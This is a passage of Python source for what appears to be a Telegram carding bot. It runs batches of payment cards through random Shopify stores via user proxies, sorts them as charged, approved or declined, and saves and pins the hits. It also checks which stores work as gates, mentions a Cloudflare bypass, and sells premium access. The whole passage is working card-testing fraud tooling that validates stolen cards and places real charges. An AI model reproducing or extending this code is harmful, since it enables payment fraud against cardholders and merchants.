                f"{progress_bar} {percentage}%\n"
                f"{premium_emoji('📊')} <b>Checked:</b> {checked}/{total}\n"
                f"{premium_emoji('🔥')} <b>Approved:</b> {approved}\n"
                f"{premium_emoji('💰')} <b>Charged:</b> {charged}\n"
                f"{premium_emoji('❌')} <b>Declined:</b> {declined}\n\n"
                f"<b>𝗟𝗮𝘀𝘁:</b> <code>{last_card_truncated}</code>\n"
                f"<b>Ｒ𝗲𝘀:</b> {last_response_clean}"
            )
            try:
                await status_msg.edit(progress_text, buttons=_ranfor_panel_buttons(), parse_mode="html")
            except:
                pass

    try:
        batch_size = 40
        for i in range(0, len(cards), batch_size):
            if not global_sites:
                await status_msg.edit(premium_emoji("❌ **All sites are dead!**\nPlease contact admin to add fresh sites.", mode="md"))
                break

            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []
            task_start_times = []

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""💎 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝘽𝙖𝙩𝙘𝙝 𝙄𝘿 🎱 : {batch_id}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 📊 : {checked}/{total}
"""
                try:
                    await status_msg.edit(premium_emoji(final_caption, mode="md"), buttons=_ranfor_panel_buttons()[:2])
                except:
                    pass
                return

            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not global_sites:
                    break
                current_site = random.choice(global_sites)
                tasks.append(check_card_with_retries_ranfor(card, current_site, user_id, global_sites))
                task_cards.append((card, current_site))
                task_start_times.append(time.time())
            
            if not tasks: continue

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
                if user_id not in ACTIVE_MTXT_PROCESSES: break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gate": "-"}

                checked += 1
                if user_id in ACTIVE_PROCESSES:
                    ACTIVE_PROCESSES[user_id]["checked"] = checked
                elapsed_time = round(time.time() - task_start_times[j], 2)
                
                response_text = result.get("Response", "")
                display_response = report_safe_response(result)
                response_text_lower = response_text.lower()
                last_card = card
                last_res = display_response

                if not is_shopify_working(response_text):
                    declined += 1
                    # Don't remove sites from global_sites list for /ran command
                    # Sites in sites.txt should remain unchanged
                    continue

                if is_3ds_required_response(response_text):
                    approved += 1
                    if user_id in ACTIVE_PROCESSES:
                        ACTIVE_PROCESSES[user_id]["hits"] = charged + approved
                    await _update_ranfor_panel()
                    await asyncio.sleep(0.1)
                    continue

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False

                status_text_lower = result.get("Status", "").lower()
                charged_keywords = ["charged", "order_paid", "order completed", "order_placed", "order placed", "thank you", "payment successful", "💎"]
                is_charged = any(key in response_text_lower for key in charged_keywords) or any(key in status_text_lower for key in charged_keywords)

                if is_charged:
                    charged += 1
                    if user_id in ACTIVE_PROCESSES:
                        ACTIVE_PROCESSES[user_id]["hits"] = charged + approved
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💰"
                    # username is defined at top of function
                    await save_approved_card(user_id, username, card, "CHARGED", result.get('Response'), result.get('Gate'), result.get('Price'))
                    should_send_message = True
                elif "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted ? change site or try again"
                    checked -= 1
                elif any(key in response_text_lower for key in ["3ds_required", "3ds_authentication", "otp_required", "invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    is_charged = False
                    if user_id in ACTIVE_PROCESSES:
                        ACTIVE_PROCESSES[user_id]["hits"] = charged + approved
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    if not is_3ds_required_response(response_text):
                        await save_approved_card(user_id, username, card, "APPROVED", result.get('Response'), result.get('Gate'), result.get('Price'))
                        should_send_message = True
                else:
                    declined += 1
                    is_charged = False
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                if should_send_message:
                    # Premium Shopify Layout with GIF
                    status_icon = "💰" if is_charged else "✅"
                    status_title = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" if is_charged else "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
                    card_msg = create_premium_gate_layout(
                        status_icon, status_title, card, display_response, "Shopify",
                        brand, bin_type, level, bank, country, flag, user_id, username, elapsed_time,
                        price=result.get('Price')
                    )
                    gif_url = get_gate_gif("Shopify")
                    result_msg = await event.reply(premium_emoji(card_msg, mode="md"), file=await _safe_gif(gif_url))
                    if is_charged: await pin_charged_message(event, result_msg)

                await _update_ranfor_panel()
                await asyncio.sleep(0.1)

        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝘽𝙖𝙩𝙘𝙝 𝙄𝘿 🎱 : {batch_id}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 📊 : {checked}/{total}
"""
        try:
            await status_msg.edit(premium_emoji(final_caption, mode="md"), buttons=_ranfor_panel_buttons()[:2])
        except:
            pass
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        ACTIVE_PROCESSES.pop(user_id, None)

async def check_card_with_retries_ranfor(card, site, user_id, global_sites, max_retries=1):
    """Check a card with automatic retry up to max_retries times on site errors"""
    last_result = None
    
    for attempt in range(max_retries):
        result = await check_card_specific_site(card, site, user_id, should_log=True)
        
        # Check if site is dead
        if is_site_dead(result.get("Response", "")) or is_retryable_card_check_response(result.get("Response", "")):
            # Don't remove sites from global_sites for /ran command
            # Just try with a new random site
            
            # If no more sites available, return dead
            if not global_sites:
                return {"Response": "All sites dead", "Price": "-", "Gate": "Shopify", "Status": "Dead"}
            
            # Try with a new random site (without removing the dead one)
            site = random.choice(global_sites)
            last_result = result
            
            # Add a small delay before retry (except on last attempt)
            if attempt < max_retries - 1:
                await asyncio.sleep(random.uniform(1, 2))
        else:
            # If no site error, return the result immediately
            return result
    
    # If all attempts failed with site errors, return as dead
    if last_result:
        return {"Response": "Retry Maxed Out after 5 attempts", "Price": last_result.get('Price', '-'), "Gate": "Shopify", "Status": "Maxed Out"}
    
    # Fallback (should never reach here)
    return {"Response": "Retry Maxed Out after 5 attempts", "Price": "-", "Gate": "Shopify", "Status": "Maxed Out"}

@client.on(events.CallbackQuery(pattern=rb"stop_ranfor:(\d+)"))
async def stop_ranfor_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: can_stop = True
        elif clicking_user_id in ADMIN_ID: can_stop = True
        if not can_stop: return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("💎 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!", alert=True)
    except Exception as e: await event.answer(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}", alert=True)



@client.on(events.NewMessage(pattern=r'(?i)^[/.]check'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not can_access:
        buttons = [
            [Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+0EgyvdopAvszODQ8")]
        ]
        return await event.reply(premium_emoji("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙧 𝘽𝙖𝙙 𝙂𝙪𝙮", mode="md"), buttons=buttons)

    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply(premium_emoji("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`", mode="md"))

    check_text = event.raw_text[6:].strip()

    if not check_text:
        buttons = [
            [Button.inline("💎 𝘾𝙝𝙚𝙘𝙠 𝙈𝙮 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨", b"check_db_sites")]
        ]

        instruction_text = """💎 **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠𝙚𝙧**

𝙄𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙨𝙞𝙩𝙚𝙨 𝙩𝙝𝙚𝙣 𝙩𝙮𝙥𝙚:

`/check`
`1. https://example.com`
`2. https://site2.com`
`3. https://site3.com`

𝘼𝙣𝙙 𝙞𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨 𝙖𝙣𝙙 𝙖𝙙𝙙 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 & 𝙧𝙚𝙢𝙤𝙫𝙚 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙡𝙞𝙘𝙠 𝙗𝙚𝙡𝙤𝙬 𝙗𝙪𝙩𝙩𝙤𝙣:"""

        return await event.reply(premium_emoji(instruction_text, mode="md"), buttons=buttons)

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:
        return await event.reply(premium_emoji("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!\n\n💎 𝙀𝙭𝙖𝙢𝙥𝙡𝙚:\n`/check`\n`1. https://example.com`\n`2. site2.com`", mode="md"))

    total_sites_found = len(sites_to_check)
    if len(sites_to_check) > 10:
        sites_to_check = sites_to_check[:10]
        await event.reply(premium_emoji(f"```⚠️ 𝙁𝙤𝙪𝙣𝙙 {total_sites_found} 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 10 𝙨𝙞𝙩𝙚𝙨```", mode="md"))

    asyncio.create_task(process_site_check(event, sites_to_check))

async def process_site_check(event, sites):
    """Process site checking in background"""
    total_sites = len(sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_msg = await event.reply(premium_emoji(f"```💎 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {total_sites} 𝙨𝙞𝙩𝙚𝙨...```", mode="md"))

    batch_size = 10
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site, user_id=event.sender_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user
            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **𝙋𝙧𝙤𝙭𝙮 𝘿𝙚𝙖𝙙!**

{result['response']}

📊 **𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝘽𝙚𝙛𝙤𝙧𝙚 𝙎𝙩𝙤𝙥:**
? 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
? 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}
📝 𝘾𝙝𝙚𝙘𝙠𝙚𝙙: {checked}/{total_sites}"""
                try:
                    await status_msg.edit(premium_emoji(final_text, mode="md"))
                except:
                    await event.reply(premium_emoji(final_text, mode="md"))
                return

            if result["status"] == "working":
                working_sites.append({"site": site, "price": result["price"]})
            else:
                dead_sites.append({"site": site, "price": result["price"]})

            working_count = len(working_sites)
            dead_count = len(dead_sites)
            
            working_sites_text = ""
            if working_sites:
                working_sites_text = "✅ **Working Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(working_sites, 1)]
                ) + "\n"
            dead_sites_text = ""
            if dead_sites:
                dead_sites_text = "❌ **Dead Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(dead_sites, 1)]
                ) + "\n"

            status_text = (
                f"```💎 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨...\n\n"
                f"📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]\n"
                f"✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}\n"
                f"❌ 𝘿𝙚𝙖𝙙: {dead_count}\n\n"
                f"🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}\n"
                f"📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}\n"
                f"💰 𝙋𝙧𝙞𝙘𝙚: {result['price']}\n"
                f"```\n"
            )
            if working_sites_text or dead_sites_text:
                status_text += working_sites_text + dead_sites_text

            try:
                await status_msg.edit(premium_emoji(status_text, mode="md"))
            except:
                pass

            await asyncio.sleep(0.1)

    final_text = f"""✅ **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
? 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
? 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}

"""
    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    buttons = []
    # Build the button only if we actually found working sites
    final_buttons = None 
    # 1. Decide if we actually have buttons to show
    # --- START CLEAN SWEEP FIX ---
    # Reset buttons to None to ensure a clean state
    final_buttons = None

    if working_sites:
        # Save working sites for the button callback
        TEMP_WORKING_SITES[event.sender_id] = [site_data['site'] for site_data in working_sites]
        
        # Build the button properly as a list within a list
        final_buttons = [
            [Button.inline("? 𝘼𝙙𝙙 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨 𝙩𝙤 𝘿𝘽", f"add_working:{event.sender_id}")]
        ]

    try:
        # Using final_buttons (which is either our button or None)
        await status_msg.edit(premium_emoji(final_text, mode="md"), buttons=final_buttons)
    except Exception as e:
        # If edit fails, try a fresh reply
        try:
            await event.reply(premium_emoji(final_text, mode="md"), buttons=final_buttons)
        except Exception:
            # Absolute last resort: send text with NO buttons at all
            await event.reply(premium_emoji(final_text, mode="md"))
    # --- END CLEAN SWEEP FIX ---

# NOW you can start the next section outside the function
@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def some_function(event):
    user_id = event.sender_id

    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])

    if not user_sites:
        return await event.answer("❌ 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨 𝙮𝙚𝙩!", alert=True)

    await event.answer("💎 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝘿𝘽 𝙨𝙞𝙩𝙚 𝙘𝙝𝙚𝙘𝙠...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):
    """Check user's DB sites and remove dead ones"""
    user_id = event.sender_id
    normalized_sites = []
    seen_keys = set()
    for site in user_sites:
        extracted = extract_and_clean_urls(get_site_url(site))
        url = extracted[0] if extracted else get_site_url(site).strip()
        key = site_dedupe_key(url)
        if key and key not in seen_keys:
            seen_keys.add(key)
            normalized_sites.append({"entry": site, "url": url})

    total_sites = len(normalized_sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_text = f"```💎 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {total_sites} 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨...```"
    await event.edit(premium_emoji(status_text, mode="md"))

    batch_size = 10
    for i in range(0, len(normalized_sites), batch_size):
        batch = normalized_sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site["url"], user_id=user_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site_data, result) in enumerate(zip(batch, results)):
            checked += 1
            site = site_data["url"]
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user
            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **𝙋𝙧𝙤𝙭𝙮 𝘿𝙚𝙖𝙙!**

{result['response']}

📊 **𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝘽𝙚𝙛𝙤𝙧𝙚 𝙎𝙩𝙤𝙥:**
? 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
? 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}
📝 𝘾𝙝𝙚𝙘𝙠𝙚𝙙: {checked}/{total_sites}"""
                try:
                    await event.edit(premium_emoji(final_text, mode="md"))
                except:
                    pass
                return

            if result["status"] == "working":
                working_sites.append(site_data["entry"])
            else:
                dead_sites.append(site_data["entry"])

            working_count = len(working_sites)
            dead_count = len(dead_sites)

            status_text = f"""```💎 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨...

📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]
✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}
❌ 𝘿𝙚𝙖𝙙: {dead_count}

🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}
📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}```"""

            try:
                await event.edit(premium_emoji(status_text, mode="md"))
            except:
                pass

            await asyncio.sleep(0.1)

    final_text = f"""✅ **𝘿𝘽 𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
? 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
? 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}

"""

    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site}`\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site}`\n"

    try:
        await event.edit(premium_emoji(final_text, mode="md"))
    except:
        pass

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())

        if event.sender_id != callback_user_id:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙛𝙧𝙤𝙢 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙘𝙝𝙚𝙘𝙠!", alert=True)

        # Get working sites from temporary storage
        working_sites = TEMP_WORKING_SITES.get(callback_user_id, [])
        
        if not working_sites:
            return await event.answer("❌ 𝙉𝙤 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨 𝙛𝙤𝙪𝙣𝙙! 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙪𝙣 /𝙘𝙝𝙚𝙘𝙠 𝙖𝙜𝙖𝙞𝙣.", alert=True)

        sites_data = await load_json(SITE_FILE)
        user_sites = sites_data.get(str(callback_user_id), [])

        added_sites = []
        already_exists = []

        existing_keys = {site_dedupe_key(site) for site in user_sites}
        for site in working_sites:
            key = site_dedupe_key(site)
            if key and key not in existing_keys:
                user_sites.append(site)
                added_sites.append(site)
                existing_keys.add(key)
            else:
                already_exists.append(site)

        sites_data[str(callback_user_id)] = dedupe_sites(user_sites)
        await save_json(SITE_FILE, sites_data)
        
        # Clear temporary storage after adding
        TEMP_WORKING_SITES.pop(callback_user_id, None)

        response_parts = []
        if added_sites:
            added_text = f"✅ **𝘼𝙙𝙙𝙚𝙙 {len(added_sites)} 𝙉𝙚𝙬 𝙎𝙞𝙩𝙚𝙨:**\n"
            for site in added_sites:
                added_text += f"• `{site}`\n"
            response_parts.append(added_text)

        if already_exists:
            exists_text = f"⚠️ **{len(already_exists)} 𝙎𝙞𝙩𝙚𝙨 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩:**\n"
            for site in already_exists:
                exists_text += f"• `{site}`\n"
            response_parts.append(exists_text)

        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n📊 **𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨 𝙞𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽:** {len(user_sites)}"
        else:
            response_text = "ℹ️ 𝘼𝙡𝙡 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙞𝙣 𝙮𝙤𝙪𝙧 𝘿𝘽!"

        await event.answer("✅ 𝙎𝙞𝙩𝙚𝙨 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙!", alert=False)

        current_text = event.message.text
        updated_text = current_text + f"\n\n🔄 **𝙐𝙥𝙙𝙖𝙩𝙚:**\n{response_text}"

        try:
            await event.edit(premium_emoji(updated_text, mode="md"), buttons=None)
        except:
            await event.respond(premium_emoji(response_text, mode="md"))

    except Exception as e:
        await event.answer(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}", alert=True)

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if not is_admin(event.sender_id):
        return await event.reply(premium_emoji("? 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", mode="md"))

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unauth {user_id}")

        user_id = int(parts[1])

        if not await is_premium_user(user_id):
            return await event.reply(premium_emoji(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙙𝙤𝙚𝙨 𝙣𝙤𝙩 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!", mode="md"))

        success = await remove_premium_user(user_id)

        if success:
            await event.reply(premium_emoji(f"✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}!", mode="md"))

            try:
                await client.send_message(user_id, premium_emoji(f"⚠️ 𝙔𝙤𝙪𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨 𝙃𝙖𝙨 𝘽𝙚𝙚𝙣 𝙍𝙚𝙫𝙤𝙠𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙞𝙣𝙦𝙪𝙞𝙧𝙞𝙚𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙧 𝘽𝙖𝙙 𝙂𝙪𝙮", mode="md"))
            except:
                pass
        else:
            await event.reply(premium_emoji(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙖𝙘𝙘𝙚𝙨𝙨 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}", mode="md"))

    except ValueError:
        await event.reply(premium_emoji("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!", mode="md"))
    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if not is_admin(event.sender_id):
        return await event.reply(premium_emoji("? 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", mode="md"))

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /ban {user_id}")

        user_id = int(parts[1])

        if await is_banned_user(user_id):
            return await event.reply(premium_emoji(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙖𝙣𝙣𝙚𝙙!", mode="md"))

        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)

        await event.reply(premium_emoji(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙖𝙣𝙣𝙚𝙙!", mode="md"))

        try:
